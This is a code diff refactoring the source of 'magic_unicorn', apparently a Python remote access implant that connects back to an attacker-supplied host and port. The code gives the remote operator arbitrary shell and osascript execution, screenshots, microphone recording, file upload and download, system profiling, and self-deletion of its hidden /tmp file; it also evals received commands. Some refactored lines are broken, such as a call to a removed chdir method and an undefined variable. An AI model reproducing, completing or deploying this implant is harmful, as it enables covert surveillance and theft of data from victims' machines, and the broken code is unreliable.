@@ -13,7 +13,7 @@ import webbrowser as browser
 from PIL import ImageGrab
 
 class handler:
-    def __init__(self,sock):
+    def __init__(self, sock):
         self.sock = sock
     def send(self, data):
         payloaded_packet = struct.pack('>I', len(data)) + data
@@ -33,6 +33,17 @@ class handler:
             payloaded_packet += frame
         return payloaded_packet
 
+class custom:
+    def __init__(self):
+        self.python = "python3"
+
+    def install(self, package):
+        subprocess.check_call([self.python, "-m", "pip", "install", "--user", package])
+
+    def execute(self, command):
+        command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        return command_output.stdout.read() + command_output.stderr.read()
+
 class badges:
     def __init__(self):
         self.I = '\033[1;77m[i] \033[0m'
@@ -45,89 +56,50 @@ class badges:
         self.RESET = '\033[0m'
 
 class magic_unicorn:
-    def __init__(self, s):
+    def __init__(self, server):
         self.version = "v2.0"
-        self.handler = handler(s)
+        self.handler = handler(server)
+        self.custom = custom()
         self.badges = badges()
 
-    def install(self, package):
-        subprocess.check_call(["python3", "-m", "pip", "install", "--user", package])
+    def command_username(self):
+        self.handler.send(getpass.getuser().encode("UTF-8"))
 
-    def execute(self, command):
-        command_output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        return command_output.stdout.read() + command_output.stderr.read()
+    def command_hostname(self):
+        self.handler.send(platform.node().encode("UTF-8"))
 
-    def upload(self, output_filename):
-        if not output_filename.strip():
-            pass
-        else:
-            if not os.path.isfile(output_filename):
-                self.handler.send((self.badges.E +"Local file: {}: does not exist!".format(output_filename)).encode("UTF-8"))
-            else:
-                self.handler.send("true".encode("UTF-8"))
-                with open(output_filename, "rb") as wf:
-                    for data in iter(lambda: wf.read(4100), "".encode("UTF-8")):
-                        try:
-                            self.handler.send(data)
-                        except(KeyboardInterrupt,EOFError):
-                            wf.close()
-                            self.handler.send("fail".encode("UTF-8"))
-                            return
-                self.handler.send("success".encode("UTF-8"))
+    def command_screenshot(self):
+        image = ImageGrab.grab()
+        image.save("/tmp/.temp_screenshot.png", 'PNG')
+        f = open("/tmp/.temp_screenshot.png", "rb").read()
+        self.handler.send(f)
+        os.remove("/tmp/.temp_screenshot.png")
 
-    def download(self, output_filename):
-        if not output_filename.strip():
-            self.handler.send("Usage: upload <local_file>".encode("UTF-8"))
-        else:
-            output_filename = output_filename.split("/")[-1] if "/" in output_filename else output_filename.split("\\")[-1] if "\\" in output_filename else output_filename
-            wf = open(output_filename, "wb")
-            while True:
-                data = self.handler.recv()
-                if data == b"success":
-                    break
-                elif data == b"fail":
-                    wf.close()
-                    os.remove(output_filename)
-                    return
-                wf.write(data)
-            wf.close()
+    def command_pwd(self):
+        self.handler.send((self.badges.I + "Current working directory: " + str(os.getcwd())).encode("UTF-8"))
 
-    def chdir(self, directory):
-        main_directory = os.getcwd()
-        temp_directory = ""
-        if directory == "-":
-            if not temp_directory:
-                self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
-            else:
-                temp_directory_2 = os.getcwd()
-                os.chdir(temp_directory)
-                self.handler.send((self.badges.I + "Changed to directory {}.".format(temp_directory)).encode("UTF-8"))
-                temp_directory = temp_directory_2
-        elif directory == "--":
-            temp_directory = os.getcwd()
-            os.chdir(main_directory)
-            self.handler.send((self.badges.I + "Changed to directory {}.".format(main_directory)).encode("UTF-8"))
-        else:
-            if not os.path.isdir(directory):
-                self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
-            else:
-                temp_directory = os.getcwd()
-                os.chdir(directory)
-                self.handler.send((self.badges.I + "Changed to directory {}.".format(directory)).encode("UTF-8"))
+    def command_pid(self):
+        self.handler.send((self.badges.I + "PID: " + str(os.getpid())).encode("UTF-8"))
 
-    def openurl(self, url):
-        browser.open(url)
-        self.handler.send("".encode("UTF-8"))
+    def command_sysinfo(self):
+        sysinfo = ""
+        sysinfo += f"Operating System: {platform.system()}\n"
+        sysinfo += f"Computer Name: {platform.node()}\n"
+        sysinfo += f"Username: {getpass.getuser()}\n"
+        sysinfo += f"Release Version: {platform.release()}\n"
+        sysinfo += f"Processor Architecture: {platform.processor()}"
+        self.handler.send(sysinfo.encode("UTF-8"))
 
-    def execute_osascript(self, script):
-        script = "osascript -e '" + script + "'"
-        self.handler.send(bytes(self.execute(script).strip()))
-        
-    def listen_audio(self):
+    def command_exit(self):
+        server.close()
+        os.remove("/tmp/.magic_unicorn")
+        sys.exit()
+
+    def command_mic(self):
         try:
             import pyaudio
         except:
-            install("pyaudio")
+            self.custom.install("pyaudio")
             try:
                 import pyaudio
             except:
@@ -162,11 +134,76 @@ class magic_unicorn:
                     p.terminate()
                     return
 
-    def say_message(self, message):
+    def command_download(self, cmd_data):
+        if not cmd_data.strip():
+            pass
+        else:
+            output_filename = cmd_data.split("/")[-1] if "/" in cmd_data else cmd_data.split("\\")[-1] if "\\" in cmd_data else cmd_data
+            wf = open(output_filename, "wb")
+            while True:
+                data = self.handler.recv()
+                if data == b"success":
+                    break
+                elif data == b"fail":
+                    wf.close()
+                    os.remove(output_filename)
+                    return
+                wf.write(data)
+            wf.close()
+
+    def command_upload(self, cmd_data):
+        if not cmd_data.strip():
+            pass
+        else:
+            if not os.path.isfile(cmd_data):
+                self.handler.send((self.badges.E +"Remote file: {}: does not exist!".format(cmd_data)).encode("UTF-8"))
+            else:
+                self.handler.send("true".encode("UTF-8"))
+                with open(cmd_data, "rb") as wf:
+                    for data in iter(lambda: wf.read(4100), "".encode("UTF-8")):
+                        try:
+                            self.handler.send(data)
+                        except(KeyboardInterrupt,EOFError):
+                            wf.close()
+                            self.handler.send("fail".encode("UTF-8"))
+                            return
+                self.handler.send("success".encode("UTF-8"))
+
+    def command_load(self, cmd_data):
+        self.handler.send(bytes(self.custom.execute(cmd_data).strip()))
+
+    def command_openurl(self, cmd_data):
+        browser.open(cmd_data)
+        self.handler.send("".encode("UTF-8"))
+
+    def command_chdir(self, cmd_data):
+        main_directory = os.getcwd()
+        temp_directory = ""
+        if cmd_data == "-":
+            if not temp_directory:
+                self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
+            else:
+                temp_directory_2 = os.getcwd()
+                os.chdir(temp_directory)
+                self.handler.send((self.badges.I + "Changed to directory {}.".format(temp_directory)).encode("UTF-8"))
+                temp_directory = temp_directory_2
+        elif cmd_data == "--":
+            temp_directory = os.getcwd()
+            os.chdir(main_directory)
+            self.handler.send((self.badges.I + "Changed to directory {}.".format(main_directory)).encode("UTF-8"))
+        else:
+            if not os.path.isdir(cmd_data):
+                self.handler.send((self.badges.E + "Failed to change directory").encode("UTF-8"))
+            else:
+                temp_directory = os.getcwd()
+                os.chdir(directory)
+                self.handler.send((self.badges.I + "Changed to directory {}.".format(cmd_data)).encode("UTF-8"))
+
+    def command_say(self, cmd_data):
         try:
             import pyttsx3
         except:
-            install("pyttsx3")
+            self.custom.install("pyttsx3")
             try:
                 import pyttsx3
             except:
@@ -174,68 +211,56 @@ class magic_unicorn:
                 return
         self.handler.send("success".encode("UTF-8"))
         engine = pyttsx3.init()
-        engine.say(message)
+        engine.say(cmd_data)
         engine.runAndWait()
-            
-    def screenshot(self):
-        image = ImageGrab.grab()
-        image.save("/tmp/.temp_screenshot.png", 'PNG')
-        f = open("/tmp/.temp_screenshot.png", "rb").read()
-        self.handler.send(f)
-        os.remove("/tmp/.temp_screenshot.png")
 
-    def sysinfo(self):
-        sysinfo = ""
-        sysinfo += f"Operating System: {platform.system()}\n"
-        sysinfo += f"Computer Name: {platform.node()}\n"
-        sysinfo += f"Username: {getpass.getuser()}\n"
-        sysinfo += f"Release Version: {platform.release()}\n"
-        sysinfo += f"Processor Architecture: {platform.processor()}"
-        self.handler.send(sysinfo.encode("UTF-8"))
+    def command_shell(self, cmd_data):
+        self.handler.send(bytes(self.custom.execute(cmd_data).strip()))
+
+    def command_osascript(self, cmd_data):
+        script = "osascript -e '" + cmd_data + "'"
+        self.handler.send(bytes(self.custom.execute(script).strip()))
 
     def shell(self):
-        global s, handler
+        global server, handler
         while True:
             command = self.handler.recv()
             if command.strip():
                 command = eval(command.decode("UTF-8", "ignore").strip())
                 if command[0] == "username":
-                    self.handler.send(getpass.getuser().encode("UTF-8"))
+                    self.command_username()
                 elif command[0] == "hostname":
-                    self.handler.send(platform.node().encode("UTF-8"))
-                elif command[0] == "download":
-                    self.upload(command[1])
-                elif command[0] == "upload":
-                    self.download(command[1])
+                    self.command_hostname()
                 elif command[0] == "screenshot":
-                    self.screenshot()
-                elif command[0] == "mic":
-                    self.listen_audio()
-                elif command[0] == "load":
-                    self.handler.send(bytes(self.execute(command[1]).strip()))
+                    self.command_screenshot()
+                elif command[0] == "pwd":
+                    self.command_pwd()
+                elif command[0] == "pid":
+                    self.command_pid()
+                elif command[0] == "sysinfo":
+                    self.command_sysinfo()
                 elif command[0] == "exit":
-                    s.close()
-                    break
+                    self.command_exit()
+                elif command[0] == "mic":
+                    self.command_mic()
+                elif command[0] == "download":
+                    self.command_upload(command[1])
+                elif command[0] == "upload":
+                    self.command_download(command[1])
+                elif command[0] == "load":
+                    self.command_load(command[1])
                 elif command[0] == "openurl":
-                    self.openurl(command[1])
+                    self.command_openurl(command[1])
                 elif command[0] == "chdir":
                     self.chdir(command[1])
                 elif command[0] == "say":
-                    self.say_message(command[1])
-                elif command[0] == "pwd":
-                    self.handler.send((self.badges.I + "Current working directory: " + str(os.getcwd())).encode("UTF-8"))
-                elif command[0] == "pid":
-                    self.handler.send((self.badges.I + "PID: " + str(os.getpid())).encode("UTF-8"))
-                elif command[0] == "sysinfo":
-                    self.sysinfo()
+                    self.command_say(command[1])
                 elif command[0] == "shell":
-                    self.handler.send(bytes(self.execute(command[1]).strip()))
+                    self.command_shell(command[1])
                 elif command[0] == "osascript":
-                    self.execute_osascript(command[1])
+                    self.command_osascript(command[1])
                 else:
                     pass
-        sys.exit()
-
 
 if len(sys.argv) != 3:
     print("Usage: magic_unicorn.py <remote_host> <remote_port>")
@@ -244,8 +269,8 @@ if len(sys.argv) != 3:
 RHOST = sys.argv[1]
 RPORT = int(sys.argv[2])
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((RHOST, RPORT))
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.connect((RHOST, RPORT))
 
-magic_handler = magic_unicorn(s)
+magic_handler = magic_unicorn(server)
 magic_handler.shell()
